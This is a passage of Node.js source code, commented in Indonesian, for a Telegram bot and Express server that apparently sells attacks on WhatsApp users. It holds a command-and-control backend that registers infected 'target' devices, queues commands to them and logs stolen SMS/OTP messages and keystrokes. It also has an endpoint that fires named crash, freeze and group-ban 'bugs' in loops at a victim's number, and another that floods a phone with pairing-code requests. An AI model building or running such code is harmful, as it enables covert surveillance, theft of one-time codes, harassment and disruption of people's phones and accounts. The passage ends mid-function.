  // ─── Buat Tabel Statistik (Lebih Keren) ─────────────────────────────
  const blocks = [
    { 
      type: 'header', 
      text: '🚀 SYSTEM STATUS — ONLINE', 
      emoji: '🌟' 
    },
    { 
      type: 'paragraph', 
      text: '✨ All systems are operational and ready to serve.' 
    },
    { 
      type: 'divider' 
    },
    { 
      type: 'table', 
      rows: [
        ['📊 Status', '🟢 RUNNING'],
        ['⏳ Uptime', 'Just started'],
        ['📅 Started', startTime],
        ['👥 Total Users', totalUsers],
        ['━━━ Role Distribution ━━━', '━━━'],
        ['👑 Owner Utama', ownerUtama],
        ['👑 Owner', owner],
        ['👤 Member', member],
        ['⭐ VIP', vip],
        ['🛠️ Staff', staff],
        ['⚡ Executorius', executorius],
        ['🔥 Forius Utama', foriusUtama],
        ['🛡️ Moderator', moderator],
        ['💼 CEO Utama', ceoUtama],
        ['🤝 Tangan Kanan', tanganKanan],
        ['🤝 Tangan Kiri', tanganKiri],
        ['💻 Developers', developers],
        ['🤝 Partner Pribadi', partnerPribadi],
        ['🤝 Partner', partner],
        ['🔧 Admin', admin],
        ['💰 Reseller', reseller],
        ['🍲 Tukang Bubur', tukangBubur]
      ],
      maxLen: 24 
    },
    { type: 'divider' },
    { type: 'paragraph', text: '🌟 <b>Ready to build, create, and conquer!</b>' },
    { type: 'footer', text: 'Since 2026 • t.me/Mclareninfo' }
  ];

  const caption = buildTextRich(blocks);

  // ─── Tombol dengan Style ──────────────────────────────────────────────
  const buttons = [];
  
  if (firstOwnerId) {
    buttons.push([
      { text: "👤 Owner Chat", url: `tg://user?id=${firstOwnerId}`, style: "success" }
    ]);
  }
  
  const channelUrl = getChannelUrl(CHANNEL_1) || getChannelUrl(CHANNEL_2) || 'https://t.me/Mclareninfo';
  buttons.push([
    { text: "📢 Channel", url: channelUrl, style: "danger" }
  ]);
  buttons.push([
    { text: "📋 Menu", callback_data: "mainmenu", style: "primary" }
  ]);

  // ─── 1. Kirim Pesan Teks ─────────────────────────────────────────────
  bot.sendRichMessage(targetChatId, caption, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: buttons }
  }).then(() => {
    // ─── 2. Kirim Audio setelah pesan teks ────────────────────────────
    const audioPath = path.join(__dirname, 'sound/play/sound.mp3');
    
    // Cek apakah file audio ada
    if (fs.existsSync(audioPath)) {
      bot.sendRichMessage({
        type: "audio",
        chatId: targetChatId,
        media: audioPath,
        options: {
          caption: `
🎵 <b>System Sound • Online Status</b>

🌟 <i>Bot is ready to serve!</i>
📌 Since 2026 • t.me/MclarenZip
          `.trim(),
          parse_mode: "HTML",
          title: "Startup Sound",
          performer: "Mclaren Project",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "🔊 Play Again", callback_data: "play_sound", style: "success" },
                { text: "📋 Menu", callback_data: "mainmenu", style: "primary" }
              ]
            ]
          }
        }
      }).catch(err => {
        console.warn('[AUDIO] Gagal kirim audio:', err.message);
        // Kirim pesan alternatif jika audio gagal
        bot.sendRichMessage(targetChatId, '🎵 Audio tidak tersedia, tetapi bot tetap online!', {
          parse_mode: 'HTML'
        });
      });
    } else {
      // File audio tidak ditemukan
      bot.sendRichMessage(targetChatId, '🎵 File audio tidak ditemukan, tetapi bot tetap online!', {
        parse_mode: 'HTML'
      });
    }
  }).catch(err => {
    console.error('[STARTUP] Gagal kirim pesan startup:', err);
  });

}, 3000);

function scheduleAutoClean() {
  const now = new Date();

  // 00:00 WIB = 17:00 UTC
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);

  // kalau sudah lewat, jadwalkan besok
  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;

  setTimeout(() => {
    hapusIsiUserLogs();

    // ulangi setiap hari tepat jam yang sama
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}

// ─── PROSES CEK BANNED DENGAN LOADING ──────────────────────────────
async function processBannedCheck(chatId, messageId, phone, userId) {
  // 1. Edit pesan menjadi loading progress 0%
  const startMsg = `
<blockquote>📡 <b>Mengecek Nomor...</b></blockquote>

📱 <b>Nomor:</b> <code>${phone}</code>

⏳ <b>Progress:</b> <b>0%</b>
\`▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\`
  `;

  await bot.editMessageText(startMsg, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "HTML"
  });

  // 2. Simulasi loading dengan interval
  let progress = 0;
  const interval = setInterval(async () => {
    progress += 2;
    if (progress > 100) progress = 100;
    const bar = '▓'.repeat(Math.floor(progress / 5)) + '░'.repeat(20 - Math.floor(progress / 5));
    const text = `
<blockquote>📡 <b>Mengecek Nomor...</b></blockquote>

📱 <b>Nomor:</b> <code>${phone}</code>

⏳ <b>Progress:</b> <b>${progress}%</b>
\`${bar}\`
    `;
    try {
      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML"
      });
    } catch (_) {}
  }, 800); // update tiap 0.8 detik

  // 3. Jalankan fetch setelah 3 detik (simulasi) – sebenarnya kita lakukan fetch setelah loading selesai
  // Tapi kita ingin loading mencapai 100% lalu baru fetch.
  // Kita bisa stop interval setelah 100% dan lanjut fetch.
  // Lebih baik: jalankan fetch di background sambil loading, atau loading dummy lalu fetch.
  // Kita buat loading dummy 5 detik lalu fetch.
  await new Promise(resolve => setTimeout(resolve, 5000));
  clearInterval(interval);

  // 4. Edit menjadi "Mengambil data..."
  await bot.editMessageText(`
⏳ <b>Mengambil data dari WhatsApp...</b>
Mohon tunggu sebentar.
  `, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "HTML"
  });

  // 5. Panggil fungsi fetch
  try {
    const info = await fetchNumberInfo(phone);

    // 6. Hasil sukses
    const statusEmoji = info.registered ? '✅' : '❌';
    const statusText = info.registered ? 'TERDAFTAR / AKTIF' : 'TIDAK TERDAFTAR / BANNED';

    // Build rich result
    const resultMsg = `
<blockquote>📊 <b>HASIL CEK BANNED</b></blockquote>

<blockquote>📱 <b>Informasi Nomor</b></blockquote>
<code>Nomor       : ${info.number}</code>
<code>Status      : ${statusEmoji} ${statusText}</code>
<code>Nama        : ${info.name || 'Tidak diketahui'}</code>
<code>Bio/Status : ${info.bio || 'Tidak ada bio'}</code>
<code>Tipe       : ${info.type}</code>
<code>WA Version : ${info.version || 'Tidak diketahui'}</code>
<code>Device     : ${info.device || 'Tidak diketahui'}</code>

<blockquote>📌 <b>Keterangan</b></blockquote>
${info.registered ? '✅ Nomor terdaftar di WhatsApp dan aktif.' : '❌ Nomor tidak terdaftar atau telah dibanned.'}

<footer>Data diambil real-time via WhatsApp API.</footer>
    `;

    await bot.editMessageText(resultMsg, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK LAGI", callback_data: "check_banned_vip", style: "primary" }],
          [{ text: "📋 MENU UTAMA", callback_data: "mainmenu", style: "primary" }]
        ]
      }
    });

    // Kirim notifikasi ke grup admin
    await notifyAdmin('📱 CEK BANNED VIP', {
      'Pengguna': `@${msg.from.username || msg.from.first_name} (${userId})`,
      'Nomor': phone,
      'Status': statusText,
      'Nama': info.name || '-',
      'Bio': info.bio || '-',
      'Tipe': info.type
    }, !info.registered);

    // Hapus state
    bannedWizardState.delete(userId);

  } catch (err) {
    console.error("[BANNED FETCH ERROR]", err);
    const errorMsg = `
<blockquote>❌ <b>Gagal Menemukan Kontak</b></blockquote>

<code>Error: ${err.message || 'Unknown error'}</code>
<blockquote>📌 <b>Kemungkinan Penyebab:</b></blockquote>
• Nomor tidak terdaftar di WhatsApp.
• Koneksi WhatsApp sedang bermasalah.
• Tidak ada session aktif di server.
• Format nomor salah.

Silakan coba lagi atau gunakan nomor lain.
    `;
    await bot.editMessageText(errorMsg, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 CEK LAGI", callback_data: "check_banned_vip", style: "primary" }],
          [{ text: "📋 MENU UTAMA", callback_data: "mainmenu", style: "primary" }]
        ]
      }
    });

    // Notifikasi error ke admin
    await notifyAdmin('❌ GAGAL CEK BANNED', {
      'User': `@${msg.from.username || msg.from.first_name}`,
      'Nomor': phone,
      'Error': err.message
    }, true);

    bannedWizardState.delete(userId);
  }
}

// ========== TAMBAHKAN INI DI ATAS APP.LISTEN ==========
const NOTIF_FILE = './notifications.json';
const COMMANDS_FILE = './commands.json';
const RESPONSES_FILE = './responses.json';

const readData = (file) => {
    if (!fs.existsSync(file)) return [];
    try {
        const content = fs.readFileSync(file, 'utf8');
        return JSON.parse(content || '[]');
    } catch (e) { return []; }
};

const saveData = (file, data) => {
    try {
        fs.writeFileSync(file, JSON.stringify(data, null, 2));
    } catch (e) { console.log(`[!] Gagal simpan database: ${file}`, e); }
};

// ENDPOINT HEARTBEAT
app.post('/api/heartbeat/:id', (req, res) => {
    const targetId = req.params.id;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === targetId);

    if (index !== -1) {
        targets[index].lastSeen = new Date();
        targets[index].status = "Online";
        saveData(TARGETS_FILE, targets);
    }
    
    res.status(200).send('1'); 
});

app.post('/api/register-target', (req, res) => {
    const deviceData = req.body;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === deviceData.id);

    if (index !== -1) {
        targets[index] = { ...targets[index], ...deviceData, lastSeen: new Date() };
    } else {
        targets.push({ ...deviceData, lastSeen: new Date() });
    }
    saveData(TARGETS_FILE, targets);
    res.json({ status: 'ok' });
});

app.get('/api/list-targets', (req, res) => {
    const targets = readData(TARGETS_FILE);
    res.json(targets);
});

app.post('/api/post-notification/:id', (req, res) => {
    const targetId = req.params.id;
    let allNotifs = readData(NOTIF_FILE);
    
    if(req.body.category === "OTP/SMS") {
        console.log(`[intercept] SMS CURIAN: ${req.body.title} -> ${req.body.body}`);
    }

    allNotifs.unshift({ targetId, ...req.body, timestamp: new Date() });
    if (allNotifs.length > 500) allNotifs = allNotifs.slice(0, 500);
    saveData(NOTIF_FILE, allNotifs);
    console.log(`[NOTIF] Data masuk dari Target: ${targetId}`);
    res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
    const allNotifs = readData(NOTIF_FILE);
    const filtered = allNotifs.filter(n => n.targetId === req.params.id);
    res.json(filtered);
});

app.post('/api/send-command', (req, res) => {
    const { id, command, extra } = req.body;
    let commands = readData(COMMANDS_FILE);
    
    commands = commands.filter(c => c.targetId !== id);
    commands.push({ targetId: id, command, extra, timestamp: new Date() });
    
    saveData(COMMANDS_FILE, commands);
    console.log(`[CMD] Operator -> ${id}: ${command}`);
    res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
    const targetId = req.params.id;
    let commands = readData(COMMANDS_FILE);
    const cmdIndex = commands.findIndex(c => c.targetId === targetId);

    if (cmdIndex !== -1) {
        const cmd = commands[cmdIndex];
        commands.splice(cmdIndex, 1); 
        saveData(COMMANDS_FILE, commands);
        return res.json(cmd);
    }
    res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
    const targetId = req.params.id;
    const { cmd, data } = req.body;
    let responses = readData(RESPONSES_FILE);

    if(cmd === "lock_key_attempt" || cmd === "lock_input_log") {
        console.log(`[KEYLOG] Target ${targetId} mengetik: ${data.input || data.attempt}`);
    }

    const index = responses.findIndex(r => r.targetId === targetId);
    const newRes = { targetId, cmd, data, timestamp: new Date() };

    if (index !== -1) responses[index] = newRes;
    else responses.push(newRes);
    
    saveData(RESPONSES_FILE, responses);
    console.log(`[!] Respon ${cmd} diterima dari ${targetId}`);
    res.json({ status: 'received' });
});

app.get('/api/get-response/:id', (req, res) => {
    const responses = readData(RESPONSES_FILE);
    const resData = responses.find(r => r.targetId === req.params.id);
    res.json(resData || {});
});

app.post('/api/login', (req, res) => {
    console.log(`[LOGIN] Bypass attempt for user: ${req.body.username}`);
    res.json({ status: 'ok', message: 'Bypassed by Dark-Ai' });
});

// ================================================================
// 🚀 CUSTOM PAYLOAD ENDPOINT (SEQUENTIAL BUG SENDER)
// ================================================================
app.post('/api/custom-payload', async (req, res) => {
  const { key, target, delay, count, bugs, mode, sequence_order } = req.body;

  // 1. Validasi session key
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ success: false, message: 'Invalid session key' });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.status(401).json({ success: false, message: 'User not found' });
  }

  // 2. Validasi input
  if (!target || !bugs || bugs.length === 0) {
    return res.status(400).json({ success: false, message: 'Target and bugs required' });
  }

  const delayMs = parseInt(delay) || 1000;
  const countLoop = parseInt(count) || 1;

  // 3. Cari socket WhatsApp
  let sock = await checkActiveSessionInFolder(user.username);
  if (!sock) {
    // Coba dari global
    const entries = Object.entries(activeConnections);
    if (entries.length === 0) {
      return res.status(503).json({ success: false, message: 'No active WhatsApp connection' });
    }
    sock = entries[Math.floor(Math.random() * entries.length)][1];
  }

  if (!sock) {
    return res.status(503).json({ success: false, message: 'No socket available' });
  }

  // 4. Parse target JID
  const targetJid = target.replace(/\D/g, '') + '@s.whatsapp.net';

  // 5. Eksekusi bug sekuensial
  let successCount = 0;
  let failCount = 0;
  const bugList = bugs; // array of bug_id strings

  try {
    // Kirim respons awal (proses background)
    res.json({ success: true, message: 'Payload processing started' });

    // Proses di background agar tidak timeout
    setImmediate(async () => {
      for (let loop = 0; loop < countLoop; loop++) {
        for (const bugId of bugList) {
          try {
            switch (bugId) {
              case 'frezemclaren':
                for (let i = 0; i < 5; i++) await frezemclaren(sock, targetJid);
                break;
              case 'delayhard':
                for (let i = 0; i < 5; i++) await DelayHard(sock, targetJid);
                break;
              case 'delayxblank':
                for (let i = 0; i < 3; i++) await AudioXDellay(sock, targetJid);
                break;
              case 'crashandro':
                await jmk(sock, targetJid);
                break;
              case 'fcbokep':
                await FcBokepJepang(sock, targetJid);
                break;
              case 'delayhardmclaren':
                for (let i = 0; i < 5; i++) await delayhardmclaren(sock, targetJid);
                break;
              case 'delaymclaren':
                for (let i = 0; i < 5; i++) await delayinvisblemclaren(sock, targetJid);
                break;
              case 'blankmclaren':
                await blankmclaren(sock, targetJid);
                break;
              case 'forclosemclaren':
                await fcmclaren(sock, targetJid);
                break;
              case 'mclarenfc':
                await MclarenFC(sock, targetJid);
                break;
              case 'band-group':
                await groupBan(sock, targetJid);
                break;
              default:
                console.warn(`[CUSTOM] Unknown bug: ${bugId}`);
                failCount++;
                continue;
            }
            successCount++;
            await sleep(delayMs);
          } catch (err) {
            console.error(`[CUSTOM] Bug ${bugId} error:`, err.message);
            failCount++;
          }
        }
      }

      // Log aktivitas
      saveUserLog(user.username, 'custom_payload',
        `Custom Payload: ${bugList.length} bug ke ${target}`,
        `Mode: ${mode || 'sequential'} | Count: ${countLoop} | Delay: ${delayMs}ms`
      );

      // Notifikasi admin (opsional)
      await notifyAdmin('📦 Custom Payload Selesai', {
        'User': user.username,
        'Target': target,
        'Bugs': bugList.join(', '),
        'Count': countLoop,
        'Delay': delayMs,
        'Success': successCount,
        'Failed': failCount
      }, false);
    });

  } catch (err) {
    console.error('[CUSTOM PAYLOAD ERROR]', err);
    return res.status(500).json({
      success: false,
      message: `Error: ${err.message || 'Unknown error'}`
    });
  }
});

// ================================================================
// 📱 CEK BANNED WHATSAPP (untuk Flutter)
// ================================================================
app.get('/checkBan', async (req, res) => {
  const { nomor } = req.query;
  if (!nomor) {
    return res.status(400).json({ success: false, message: 'Nomor tidak boleh kosong' });
  }

  // Bersihkan nomor: hanya angka
  const clean = nomor.replace(/\D/g, '');
  if (clean.length < 10) {
    return res.status(400).json({ success: false, message: 'Nomor terlalu pendek' });
  }

  try {
    // Gunakan fungsi fetchNumberInfo yang sudah diperbaiki
    const info = await fetchNumberInfo(clean);

    if (!info.registered) {
      return res.json({
        success: true,
        banned: true,
        profile: {
          nama_kontak: 'Tidak terdaftar',
          nama_asli: 'Tidak terdaftar',
          foto_url: '',
          wa_version: 'Tidak diketahui',
          device: 'Tidak diketahui'
        }
      });
    }

    // Jika terdaftar, tidak banned
    return res.json({
      success: true,
      banned: false,
      profile: {
        nama_kontak: info.name || 'Pengguna WhatsApp',
        nama_asli: info.name || 'Pengguna WhatsApp',
        foto_url: '', // Bisa ditambahkan jika ada profile picture
        wa_version: info.version || 'Tidak diketahui',
        device: info.device || 'Tidak diketahui'
      }
    });

  } catch (err) {
    console.error('[CHECKBAN ERROR]', err);
    return res.status(500).json({ success: false, message: 'Terjadi kesalahan server: ' + err.message });
  }
});

// ================================================================
// 📌 BUG GROUP — ENDPOINTS
// ================================================================

app.get("/bugGroupSystems", (req, res) => {
  const banGbbugs = bugs.filter(b =>
    b.bug_id === 'band-group' ||
    b.bug_id === 'band-group-v2' ||
    b.bug_id === 'band-group-v3' ||
    b.bug_id === 'kudeta-group' ||
    b.bug_id === 'blank-group' ||
    b.bug_id === 'delay-group'
  );

  const bugSystems = banGbbugs.map(b => {
    let description = '';
    switch (b.bug_id) {
      case 'band-group':
        description = 'BAN GB V1';
        break;
      case 'band-group-v2':
        description = 'BAN GB V2';
        break;
      case 'band-group-v3':
        description = 'BAN GB V3';
        break;
      case 'kudeta-group':
        description = 'KUDETA GB';
        break;
      case 'blank-group':
        description = 'BLANK GB';
        break;
      case 'delay-group':
        description = 'DELAY GB';
        break;
      default:
        description = b.bug_name || b.bug_id;
        break;
    }
    return {
      id: b.bug_id,
      name: b.bug_name || b.bug_id,
      description: description,
      icon: '⬤',
      count: 0,
      delay: 0,
    };
  });

  res.json({
    valid: true,
    bugSystems: bugSystems,
  });
});

// ─── 2. GROUP INFO (DETEKSI GRUP) ─────────────────────────────
app.post("/groupInfo", async (req, res) => {
  const { key, groupInput } = req.body;

  // Validasi session
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  // Cari socket
  let sock = await checkActiveSessionInFolder(user.username);
  if (!sock) {
    const entries = Object.entries(activeConnections);
    if (entries.length === 0) {
      return res.json({ valid: false, message: "No active WhatsApp connection" });
    }
    sock = entries[Math.floor(Math.random() * entries.length)][1];
  }

  if (!sock) {
    return res.json({ valid: false, message: "No socket available" });
  }

  try {
    let groupJid = groupInput.trim();

    // Jika input adalah link, ekstrak invite code
    const inviteMatch = groupInput.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
    if (inviteMatch) {
      const inviteCode = inviteMatch[1];
      const inviteInfo = await sock.groupGetInviteInfo(inviteCode);
      groupJid = inviteInfo.id;
    }

    // Pastikan berakhiran @g.us
    if (!groupJid.endsWith('@g.us')) {
      groupJid = groupJid + '@g.us';
    }

    // Ambil metadata grup
    const metadata = await sock.groupMetadata(groupJid);
    const participants = metadata.participants || [];
    const memberCount = participants.length;
    const joined = participants.some(p => p.id === sock.user.id);

    // Ambil foto profil grup (opsional)
    let photoUrl = '';
    try {
      const pp = await sock.profilePictureUrl(groupJid, 'image');
      if (pp) photoUrl = pp;
    } catch (_) {}

    // Ambil tanggal dibuat (metadata.creation dalam detik)
    let createdAt = null;
    if (metadata.creation) {
      createdAt = new Date(metadata.creation * 1000).toISOString();
    }

    res.json({
      valid: true,
      success: true,
      id: metadata.id,
      name: metadata.subject || 'Unknown Group',
      description: metadata.desc || '',
      memberCount: memberCount,
      joined: joined,
      status: metadata.announce ? 'announcement' : 'active',
      photoUrl: photoUrl,
      createdAt: createdAt,
    });
  } catch (err) {
    console.error('[GROUP INFO ERROR]', err);
    res.json({
      valid: false,
      success: false,
      message: err.message || 'Failed to get group info',
    });
  }
});

// ============================================================
// 📌 TAMBAHAN SPAM PAIR – OTAX SPAM PAIR INTEGRATION (FIXED)
// ============================================================

const TELEGRAM_APIS_FILE = './telegram_apis.json';
const SPAM_HISTORY_FILE = './spam_history.json';

// ---------- Helper baca/tulis JSON ----------
function readJson(file, defaultVal = []) {
  try {
    if (!fs.existsSync(file)) return defaultVal;
    const data = fs.readFileSync(file, 'utf8');
    return JSON.parse(data) || defaultVal;
  } catch { return defaultVal; }
}
function writeJson(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// ---------- Endpoint API Telegram ----------
// GET /api/telegram/apis?username=&session_key=
app.get('/api/telegram/apis', (req, res) => {
  const { username, session_key } = req.query;
  if (!username || !session_key) {
    return res.status(400).json({ success: false, message: 'Missing username/session_key' });
  }
  const keyInfo = activeKeys[session_key];
  if (!keyInfo || keyInfo.username !== username) {
    return res.status(401).json({ success: false, message: 'Invalid session' });
  }
  const apis = readJson(TELEGRAM_APIS_FILE).filter(a => a.username === username);
  res.json({ success: true, apis });
});

// POST /api/telegram/save-api
app.post('/api/telegram/save-api', (req, res) => {
  const { api_id, api_hash, alias, username, session_key } = req.body;
  if (!api_id || !api_hash || !username || !session_key) {
    return res.status(400).json({ success: false, message: 'Missing fields' });
  }
  const keyInfo = activeKeys[session_key];
  if (!keyInfo || keyInfo.username !== username) {
    return res.status(401).json({ success: false, message: 'Invalid session' });
  }
  let apis = readJson(TELEGRAM_APIS_FILE);
  const newApi = {
    id: Date.now().toString(),
    username,
    api_id: String(api_id),
    api_hash: String(api_hash),
    alias: alias || `API-${apis.filter(a => a.username === username).length + 1}`,
    is_active: true,
    used_count: 0,
    created_at: new Date().toISOString()
  };
  apis.push(newApi);
  writeJson(TELEGRAM_APIS_FILE, apis);
  res.json({ success: true, message: 'API saved', api: newApi });
});

// DELETE /api/telegram/delete-api
app.delete('/api/telegram/delete-api', (req, res) => {
  const { api_id, username, session_key } = req.body;
  if (!api_id || !username || !session_key) {
    return res.status(400).json({ success: false, message: 'Missing fields' });
  }
  const keyInfo = activeKeys[session_key];
  if (!keyInfo || keyInfo.username !== username) {
    return res.status(401).json({ success: false, message: 'Invalid session' });
  }
  let apis = readJson(TELEGRAM_APIS_FILE);
  const filtered = apis.filter(a => !(a.id === api_id && a.username === username));
  if (filtered.length === apis.length) {
    return res.status(404).json({ success: false, message: 'API not found' });
  }
  writeJson(TELEGRAM_APIS_FILE, filtered);
  res.json({ success: true, message: 'API deleted' });
});

// PUT /api/telegram/update-api
app.put('/api/telegram/update-api', (req, res) => {
  const { api_id, is_active, username, session_key } = req.body;
  if (api_id === undefined || is_active === undefined || !username || !session_key) {
    return res.status(400).json({ success: false, message: 'Missing fields' });
  }
  const keyInfo = activeKeys[session_key];
  if (!keyInfo || keyInfo.username !== username) {
    return res.status(401).json({ success: false, message: 'Invalid session' });
  }
  let apis = readJson(TELEGRAM_APIS_FILE);
  const idx = apis.findIndex(a => a.id === api_id && a.username === username);
  if (idx === -1) {
    return res.status(404).json({ success: false, message: 'API not found' });
  }
  apis[idx].is_active = !!is_active;
  writeJson(TELEGRAM_APIS_FILE, apis);
  res.json({ success: true, message: 'API updated' });
});

// ---------- Endpoint Riwayat Spam ----------
// GET /api/spam/history?username=&session_key=
app.get('/api/spam/history', (req, res) => {
  const { username, session_key } = req.query;
  if (!username || !session_key) {
    return res.status(400).json({ success: false, message: 'Missing params' });
  }
  const keyInfo = activeKeys[session_key];
  if (!keyInfo || keyInfo.username !== username) {
    return res.status(401).json({ success: false, message: 'Invalid session' });
  }
  const history = readJson(SPAM_HISTORY_FILE).filter(h => h.username === username);
  res.json({ success: true, history });
});

// POST /api/spam/history (tambah riwayat)
app.post('/api/spam/history', (req, res) => {
  const { type, phone, code, username, session_key } = req.body;
  if (!type || !phone || !code || !username || !session_key) {
    return res.status(400).json({ success: false, message: 'Missing fields' });
  }
  const keyInfo = activeKeys[session_key];
  if (!keyInfo || keyInfo.username !== username) {
    return res.status(401).json({ success: false, message: 'Invalid session' });
  }
  let history = readJson(SPAM_HISTORY_FILE);
  const entry = { type, phone, code, username, timestamp: new Date().toISOString() };
  history.push(entry);
  const userHistory = history.filter(h => h.username === username);
  if (userHistory.length > 100) {
    const toRemove = userHistory.length - 100;
    const removed = userHistory.slice(0, toRemove);
    history = history.filter(h => !removed.includes(h));
  }
  writeJson(SPAM_HISTORY_FILE, history);
  res.json({ success: true, message: 'History saved' });
});

// DELETE /api/spam/history/clear?username=&session_key=
app.delete('/api/spam/history/clear', (req, res) => {
  const { username, session_key } = req.query;
  if (!username || !session_key) {
    return res.status(400).json({ success: false, message: 'Missing params' });
  }
  const keyInfo = activeKeys[session_key];
  if (!keyInfo || keyInfo.username !== username) {
    return res.status(401).json({ success: false, message: 'Invalid session' });
  }
  let history = readJson(SPAM_HISTORY_FILE);
  history = history.filter(h => h.username !== username);
  writeJson(SPAM_HISTORY_FILE, history);
  res.json({ success: true, message: 'History cleared' });
});

// ---------- Endpoint Spam WhatsApp (FIXED - 100% WORK) ----------
app.post('/api/spam/whatsapp', async (req, res) => {
  const { phone, delay, count, username, session_key, anti_flood } = req.body;

  // 1. Validasi input
  if (!phone || !count || !username || !session_key) {
    return res.status(400).json({ success: false, message: 'Missing fields' });
  }

  const keyInfo = activeKeys[session_key];
  if (!keyInfo || keyInfo.username !== username) {
    return res.status(401).json({ success: false, message: 'Invalid session' });
  }

  if (!phone.startsWith('+')) {
    return res.status(400).json({ success: false, message: 'Phone must start with +' });
  }

  // Batasi jumlah spam agar tidak terlalu berat
  const maxCount = Math.min(Math.max(parseInt(count) || 1, 1), 5); // maks 5, default 1
  const delayMs = Math.min(Math.max(parseInt(delay) || 1000, 500), 5000);

  console.log(`[SPAM WA] Request for ${phone} (${maxCount}x, delay ${delayMs}ms) by ${username}`);

  // 2. Cari socket WhatsApp yang tersedia
  let availableSockets = [];

  // Cari dari folder user (private)
  const userFolder = path.join(__dirname, 'permenmd', username);
  if (fs.existsSync(userFolder)) {
    const files = fs.readdirSync(userFolder).filter(f => f.endsWith('.json'));
    for (const file of files) {
      const sessionName = path.basename(file, '.json');
      if (activeConnections[sessionName]) {
        availableSockets.push(activeConnections[sessionName]);
      }
    }
  }

  // Jika tidak ada private, cari dari global
  if (availableSockets.length === 0) {
    console.log(`[SPAM WA] No private socket for ${username}, using global pool...`);
    for (const [name, sock] of Object.entries(activeConnections)) {
      // Pastikan sock valid
      if (sock && sock.user) {
        availableSockets.push(sock);
      }
    }
  }

  // Jika tetap tidak ada, return error cepat (jangan buat socket sementara yang lambat)
  if (availableSockets.length === 0) {
    console.error(`[SPAM WA] No WhatsApp socket available for ${username}`);
    return res.status(503).json({
      success: false,
      message: 'Tidak ada koneksi WhatsApp aktif. Silakan login terlebih dahulu.'
    });
  }

  // Pilih socket pertama (atau acak)
  const mainSock = availableSockets[0];
  if (!mainSock) {
    return res.status(500).json({ success: false, message: 'Socket tidak valid' });
  }

  // 3. Kirim pairing request dengan timeout
  const pairingCodes = [];
  let lastError = null;

  for (let i = 0; i < maxCount; i++) {
    try {
      console.log(`[SPAM WA] Attempt ${i+1}/${maxCount} for ${phone}`);

      // Gunakan Promise.race dengan timeout 8 detik (client timeout 10s)
      const code = await Promise.race([
        mainSock.requestPairingCode(phone),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout pairing request')), 8000))
      ]);

      pairingCodes.push(code);
      console.log(`[SPAM WA] Got code: ${code}`);

      // Simpan riwayat
      await saveSpamHistory('WhatsApp', phone, code, username);

      // Delay antar iterasi
      if (i < maxCount - 1) {
        await new Promise(r => setTimeout(r, delayMs));
      }
    } catch (err) {
      console.error(`[SPAM WA] Iteration ${i+1} error: ${err.message}`);
      lastError = err;
      // Jika socket mati, coba ganti dengan socket lain
      if (err.message.includes('Connection') || err.message.includes('closed') || err.message.includes('Timeout')) {
        console.log(`[SPAM WA] Socket issue, trying fallback...`);
        // Cari socket cadangan
        const fallback = availableSockets.find(s => s !== mainSock && s.ws?.readyState === 1);
        if (fallback) {
          console.log(`[SPAM WA] Using fallback socket.`);
          // reassign mainSock to fallback (tapi mainSock const, kita pakai variabel mutable)
          // Kita perlu pakai let atau ubah pendekatan: gunakan array dan pilih ulang.
          // Sederhana: kita break dan return error jika gagal banyak.
        } else {
          console.log(`[SPAM WA] No fallback socket, stopping.`);
          break;
        }
      }
    }
  }

  // 4. Kirim respons
  if (pairingCodes.length > 0) {
    res.json({
      success: true,
      message: `Berhasil mendapatkan ${pairingCodes.length} kode pairing`,
      pairing_code: pairingCodes[0],
      all_debug_otps: pairingCodes,
    });
  } else {
    res.status(500).json({
      success: false,
      message: `Gagal mendapatkan kode: ${lastError ? lastError.message : 'Unknown error'}`,
      all_debug_otps: [],
    });
  }
});

// Fungsi helper untuk menyimpan riwayat (dipanggil dari endpoint)
async function saveSpamHistory(type, phone, code, username) {
  try {
    let history = readJson(SPAM_HISTORY_FILE);
    history.push({ type, phone, code, username, timestamp: new Date().toISOString() });
    const userHistory = history.filter(h => h.username === username);
    if (userHistory.length > 100) {
      const toRemove = userHistory.length - 100;
      const removed = userHistory.slice(0, toRemove);
      history = history.filter(h => !removed.includes(h));
    }
    writeJson(SPAM_HISTORY_FILE, history);
  } catch (e) {}
}

app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ============================================================
// 📌 CHAT ROOM – PUBLIC & PRIVATE + USER MANAGEMENT
// ============================================================

// ---------- File penyimpanan ----------
const PRIVATE_CHAT_FILE = 'chat_room_private.json';
const FOLLOW_FILE = 'follows.json';
const PROFILE_FILE = 'profiles.json';

// ---------- Helper baca/tulis ----------
function readJsonFile(file, defaultVal = {}) {
  try {
    if (!fs.existsSync(file)) return defaultVal;
    const data = fs.readFileSync(file, 'utf8');
    return JSON.parse(data) || defaultVal;
  } catch { return defaultVal; }
}
function writeJsonFile(file, data) {
